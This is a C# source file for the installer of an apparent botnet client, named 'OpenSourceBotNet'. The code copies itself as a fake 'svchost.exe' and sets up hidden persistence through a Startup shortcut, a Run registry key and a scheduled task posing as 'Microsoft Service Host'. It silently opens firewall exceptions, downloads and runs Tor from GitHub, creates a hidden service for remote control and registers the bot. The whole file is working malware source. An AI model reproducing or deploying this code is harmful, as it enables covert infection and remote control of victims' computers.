using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections;

using vbAccelerator.Components.Shell;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;

using OpenSourceBotNet.Core;
using OpenSourceBotNet.Core.Helpers;

namespace OpenSourceBotNet.Core.Helpers
{
    public class FluxInstaller
    {
        private ArrayList alTorURLs = new ArrayList();

        public FluxInstaller()
        {
            alTorURLs.Add("https://github.com/ullmn/1/archive/master.zip");
            alTorURLs.Add("https://github.com/bllmn/1/archive/master.zip");
        }

        public static bool checkMethInstalled()
        {
            if (System.IO.File.Exists(System.Windows.Forms.Application.StartupPath + "\\installed.txt"))
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public void installMeth()
        {
            if (System.IO.File.Exists(System.Windows.Forms.Application.StartupPath + "\\installed.txt") == false)
            {
                string si = Application.ExecutablePath.ToString();

                try
                {
                    System.IO.Directory.CreateDirectory(FluxGlobal.sInstallDirectory);
                }
                catch (Exception ex) { }

                try
                {
                    System.IO.File.Copy(si, FluxGlobal.sInstallDirectory + "\\svchost.exe");
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }

                try
                {
                    System.IO.File.WriteAllText(FluxGlobal.sInstallDirectory + "\\installed.txt", FluxGlobal.dVersion.ToString());
                }
                catch (Exception ex) { }

                try
                {
                    string deskDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

                    if (File.Exists(deskDir + "\\ServiceHost.url") == false)
                    {
                        using (StreamWriter writer = new StreamWriter(deskDir + "\\ServiceHost.url"))
                        {
                            string app = FluxGlobal.sInstallDirectory + "\\svchost.exe";
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + app);
                            writer.WriteLine("IconIndex=0");
                            string icon = app.Replace('\\', '/');
                            writer.WriteLine("IconFile=" + icon);
                            writer.Flush();
                        }

                        System.IO.File.SetAttributes(deskDir + "\\ServiceHost.url", FileAttributes.Hidden);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }

                // Try Registry Last incase we get popped
                try
                {
                    RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    add.SetValue("System Service", "\"" + FluxGlobal.sInstallDirectory + "\\svchost.exe" + "\"");
                }
                catch(Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }

                try
                {
                    // Get the service on the local machine
                    using (TaskService ts = new TaskService())
                    {

                        TaskLogonType logonType = TaskLogonType.ServiceAccount;

                        string userId = "SYSTEM"; // string.Concat(Environment.UserDomainName, "\\", Environment.UserName);

                        // Create a new task definition and assign properties
                        TaskDefinition td = ts.NewTask();
                        //td.Settings.ExecutionTimeLimit = TimeSpan.FromMinutes(15);
                        //Version v = new Version("_v2");
                        //if (ts.HighestSupportedVersion == v)
                        ////{
                        td.Principal.RunLevel = TaskRunLevel.LUA;
                        td.Principal.LogonType = logonType;
                        
                        td.RegistrationInfo.Description = "Microsoft Service Host";
                        td.RegistrationInfo.Author = "SYSTEM";
                        td.Principal.DisplayName = "Service Host";
                        
                        //}

                        LogonTrigger lt = new LogonTrigger();
                        lt.Enabled = true;

                        BootTrigger bt = new BootTrigger();
                        bt.Delay = TimeSpan.FromMinutes(5);
                       

                        // Create a trigger that will fire the task at this time every other day
                        td.Triggers.Add(lt);

                        // Create an action that will launch Notepad whenever the trigger fires
                        td.Actions.Add(new ExecAction(FluxGlobal.sInstallDirectory + "\\svchost.exe"));
                        
                        try
                        {
                            ts.RootFolder.RegisterTaskDefinition("ServiceHost", td, TaskCreation.CreateOrUpdate, "SYSTEM", null, TaskLogonType.ServiceAccount);
                        }
                        catch(Exception ex2)
                        {
                            Console.WriteLine(ex2.ToString());
                        }
                    }

                }
                catch (Exception ex) { Console.WriteLine(ex.ToString()); }

                string torDirectory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\tor\\";

                try
                {
                    ProcessStartInfo procStartInfo = new ProcessStartInfo("c:\\windows\\system32\\netsh.exe", "firewall add allowedprogram " + torDirectory + "\\svchost.exe" + " ServiceHost ENABLE");
                    Process proc = new Process();
                    proc.StartInfo = procStartInfo;
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.CreateNoWindow = true;
                    proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    proc.Start();
                }
                catch (Exception ex)
                {

                }

                try
                {
                    ProcessStartInfo procStartInfo = new ProcessStartInfo("c:\\windows\\system32\\netsh.exe", "firewall add allowedprogram " + torDirectory + "\\tor\\tor.exe" + " TorHost ENABLE");
                    Process proc = new Process();
                    proc.StartInfo = procStartInfo;
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.CreateNoWindow = true;
                    proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    proc.Start();
                }
                catch (Exception ex)
                {

                }

                string sDownloadPath = FluxGlobal.sInstallDirectory + "\\Tor\\";

                if (System.IO.Directory.Exists(sDownloadPath) == false)
                {
                    System.IO.Directory.CreateDirectory(sDownloadPath);
                }

                sDownloadPath = sDownloadPath + "tor.zip";

                if (System.IO.File.Exists(sDownloadPath.Replace("tor.zip", "tor.exe")) == false)
                {
                    //if(System.IO.Directory.Exists(torDirectory) == false)
                    //{
                    //    System.IO.Directory.CreateDirectory(torDirectory);
                    //}

                    bool bGoodDownload = false;
                    System.Net.WebClient wc = new System.Net.WebClient();

                    while (bGoodDownload == false && alTorURLs.Count > 0)
                    {
                        string sUrl = alTorURLs[0].ToString();
                        alTorURLs.RemoveAt(0);

                        try
                        {
                            wc.DownloadFile(sUrl, sDownloadPath);
                            bGoodDownload = true;
                        }
                        catch { }

                        if (bGoodDownload == true) { break; }
                    }

                    try
                    {
                        UnZip(sDownloadPath, sDownloadPath.Replace("tor.zip", ""));

                        System.IO.Directory.Move(sDownloadPath.Replace("tor.zip","") + "\\1-master", torDirectory);

                        string torrc = "SocksPort 9050\r\nSocksBindAddress 127.0.0.1\r\nAllowUnverifiedNodes middle,rendezvous\r\nDataDirectory " + torDirectory.Replace("\\", "/") + "\r\nHiddenServiceDir " + torDirectory.Replace("\\", "/") + "/hidden_service/\r\nHiddenServicePort 57480 127.0.0.1:41375";
                        System.IO.File.WriteAllText(torDirectory + "torrc", torrc);

                        try
                        {
                            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo(torDirectory + "\\tor.exe", "--defaults-torrc \"" + torDirectory + "\\torrc\"");
                            psi.UseShellExecute = false;
                            psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                            psi.CreateNoWindow = true;
                            psi.RedirectStandardError = true;
                            psi.RedirectStandardOutput = true;
                            psi.RedirectStandardInput = true;

                            System.Diagnostics.Process serviceProcess = new System.Diagnostics.Process();
                            serviceProcess.StartInfo = psi;
                            serviceProcess.Start();
                            System.Threading.Thread.Sleep(120000);
                            serviceProcess.Kill();
                        }
                        catch (Exception ex)
                        {

                        }

                        string sHiddenServiceAddress = System.IO.File.ReadAllText(torDirectory + "\\hidden_service\\hostname");

                        System.IO.File.WriteAllText(torDirectory + "torrc", torrc.Replace("57480", OnionToPort(sHiddenServiceAddress).ToString()));
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }

                FluxApiClient.RegisterBot();
            }
        }

        public static void UnZip(string zipFile, string folderPath)
        {
            if (!Directory.Exists(folderPath))
                Directory.CreateDirectory(folderPath);

            Shell32.Shell objShell = new Shell32.Shell();
            Shell32.Folder destinationFolder = objShell.NameSpace(folderPath);
            Shell32.Folder sourceFile = objShell.NameSpace(zipFile);

            foreach (var file in sourceFile.Items())
            {
                destinationFolder.CopyHere(file, 4 | 16);
            }
        }

        private int OnionToPort(string onion)
        {
            string sRemotePort = "";

            byte[] bOnion = new byte[5];
            char[] cOnion = onion.ToCharArray();
            for (int x = 0; x < 16; x++)
            {
                byte b = Convert.ToByte(cOnion[x]);
                int i = Convert.ToInt32(b);

                sRemotePort += i.ToString();

                string sFirstChar = sRemotePort.Substring(0, 1);
                while (int.Parse(sFirstChar) > 5 && sRemotePort.Length > 1)
                {
                    sRemotePort = sRemotePort.Substring(1);
                    sFirstChar = sRemotePort.Substring(0, 1);
                }

                if (sRemotePort.Length == 5)
                {
                    break;
                }

                if (sRemotePort.Length > 5)
                {
                    sRemotePort = sRemotePort.Substring(0, 5);
                    break;
                }
            }

            return int.Parse(sRemotePort);
        }
    }
}
